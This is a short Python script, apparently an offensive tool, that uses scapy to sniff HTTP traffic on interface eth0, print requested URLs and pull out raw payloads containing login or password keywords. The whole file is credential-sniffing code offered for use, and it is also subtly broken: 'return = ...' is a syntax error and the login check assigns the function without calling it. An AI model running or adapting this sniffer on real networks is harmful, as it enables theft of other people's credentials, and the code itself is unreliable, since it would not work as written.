#! /usr/bin/env python3

import scapy.all as scapy


from scapy.layers import http

def sniff(interface):
	scapy.sniff(iface = interface,store = False,prn = packet_printer)

def get_url(packet):
	return = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
def get_login_info(packet):
	if packet.haslayer(scapy.Raw):
			load = packet[scapy.Raw].load
			keywords = ["Username","username","login","user","password","pass"]
			for keyword in keywords:
				if keyword in load:
					return load
def packet_printer(packet):
	if packet.haslayer(http.HTTPRequest):
		url = get_url(packet)
		print("url >>> " + url)
		login = get_login_info
		if login:
			print("password >> " + login)
		


sniff("eth0")